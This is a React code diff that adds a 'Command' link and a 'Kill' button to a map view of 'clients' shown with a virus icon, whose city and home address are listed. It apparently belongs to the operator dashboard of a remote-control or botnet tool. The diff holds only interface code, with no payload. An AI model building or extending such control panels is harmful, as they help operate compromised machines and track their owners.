@@ -2,6 +2,9 @@ import React, {useEffect, useState} from "react";
 import {GoogleMap, InfoWindow, Marker, withGoogleMap, withScriptjs} from "react-google-maps";
 import virus from '../../../src/media/virus.svg'
 import axios from "../../axios";
+import {NavLink} from "react-router-dom";
+import {killClient} from "../../api/api";
+import styled from "@emotion/styled";
 
 function GlobalMap() {
 
@@ -36,6 +39,12 @@ function GlobalMap() {
     function displayClientInfo() {
         let currentLat = currentClient?.location.lat;
         let currentLng = currentClient?.location.lng;
+
+        function killCurrentClient(clientId) {
+            killClient(clientId).then()
+            setDisplayClient(false)
+        }
+
         return (
             <>
                 {(currentLng && currentLat) &&
@@ -60,12 +69,20 @@ function GlobalMap() {
                             <li>City: {currentClient.location.city}</li>
                             <li>Home address: {currentClient.location.home_address}</li>
                         </ul>
+                        <CommandRedirect>
+                            <NavLink to={`/control/${currentClient.client_id}`}
+                                     style={{textDecoration: 'none', color: 'white'}}>
+                                Command
+                            </NavLink>
+                        </CommandRedirect>
+                        <KillButton onClick={() => killCurrentClient(currentClient.client_id)}>Kill</KillButton>
                     </div>
                 </InfoWindow>
                 }
             </>
         )
     }
+
 
     function createClientIcon(client) {
         return (
@@ -115,3 +132,38 @@ function GoogleMapFull() {
 }
 
 export default GoogleMapFull;
+
+const KillButton = styled.button`
+  min-width: 5em;
+  padding: 0.125em 0.125em;
+  margin-left: 1em;
+  background-color: #D11A2A;
+  border-radius: 5px;
+  border: none;
+  color: #fafafa;
+  font-weight: bold;
+  text-decoration: none;
+
+  &:hover {
+    filter: brightness(1);
+    background-color: red;
+    border-color: #98d14a;
+  }
+`
+
+const CommandRedirect = styled.button`
+  min-width: 5em;
+  max-width: 10em;
+  padding: 0.125em 0.125em;
+  margin-left: 1em;
+  background-color: #007bff;
+  border-radius: 5px;
+  border: none;
+  text-decoration: none;
+  font-weight: bold;
+
+  &:hover {
+    filter: brightness(0.9);
+    background-color: #007bff;
+  }
+`
